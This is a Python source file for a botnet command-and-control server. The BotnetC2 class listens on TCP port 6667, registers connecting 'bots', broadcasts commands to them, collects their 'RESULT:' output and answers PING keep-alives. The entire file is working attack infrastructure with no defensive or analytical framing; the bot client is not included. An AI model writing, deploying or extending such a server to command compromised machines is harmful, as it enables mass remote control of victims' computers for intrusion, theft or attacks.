import socket
import threading
import time
from src.utils import add_system_log

class BotnetC2:
    def __init__(self, host='0.0.0.0', port=6667):
        self.host = host
        self.port = port
        self.bots = {}
        self.commands = []
        self.logs = []
        self.running = False

    def log(self, message):
        add_system_log(f"[bold yellow]C2:[/] {message}")

    def broadcast(self, message):
        dead_ids = []
        for bot_id, client in self.bots.items():
            try:
                client.send(message.encode() + b"\n")
            except:
                dead_ids.append(bot_id)
        for dead_id in dead_ids:
            if dead_id in self.bots:
                del self.bots[dead_id]
        if dead_ids:
            self.log(f"Removed {len(dead_ids)} disconnected bots")

    def start_server(self):
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        server.bind((self.host, self.port))
        server.listen(100)
        self.running = True
        self.log(f"🟢 C2 server started on {self.port}")
        while self.running:
            try:
                server.settimeout(1.0)
                try:
                    client, addr = server.accept()
                except socket.timeout:
                    continue
                bot_id = f"{addr[0]}:{addr[1]}"
                self.bots[bot_id] = client
                self.log(f"🤖 Bot connected: {bot_id}")
                threading.Thread(target=self.handle_bot, args=(client, bot_id), daemon=True).start()
            except Exception as e:
                if self.running:
                    self.log(f"❌ Server Error: {e}")
                break
        server.close()
        self.running = False
        self.log("🔴 C2 server stopped")

    def handle_bot(self, client, bot_id):
        while self.running:
            try:
                client.settimeout(1.0)
                try:
                    data = client.recv(1024)
                except socket.timeout:
                    continue
                if not data:
                    break
                command = data.decode().strip()
                if command.startswith("RESULT:"):
                    self.log(f"📩 [{bot_id}] {command[7:]}")
                elif command == "PING":
                    client.send(b"PONG\n")
            except:
                break
        if bot_id in self.bots:
            del self.bots[bot_id]
        client.close()
        self.log(f"🔌 Bot disconnected: {bot_id}")

    def send_command(self, command):
        for bot_id, client in self.bots.items():
            try:
                client.send(f"{command}\n".encode())
            except:
                pass
